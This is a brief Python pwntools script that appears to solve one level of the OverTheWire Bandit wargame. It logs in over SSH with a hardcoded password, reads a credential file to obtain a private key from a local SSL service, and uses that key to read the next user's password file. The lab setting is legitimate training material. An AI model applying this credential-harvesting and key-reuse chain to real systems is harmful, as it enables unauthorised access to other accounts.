from pwn import *

hostname = 'bandit.labs.overthewire.org'
username = 'bandit16'
password = 'cluFn7wTiGryunymYOu4RcffSxQluehd'
cmd = "cat /etc/bandit_pass/bandit16 | openssl s_client -connect 127.0.0.1:31790 -quiet | sed -e 's/Correct!//' | sed '/^\s*$/d' > /tmp/bandit17.sshkey.private && chmod 400 /tmp/bandit17.sshkey.private && ssh -q -o StrictHostKeyChecking=no -i /tmp/bandit17.sshkey.private bandit17@localhost cat /etc/bandit_pass/bandit17 && rm -f /tmp/bandit17.sshkey.private"

s =  ssh(host=hostname, user=username, password=password)
ex = s.run(cmd)
data = ex.recvall()

occur = [m.start() for m in re.finditer('\n', data)]
data = data[occur[len(occur)-2]+1:]
print data

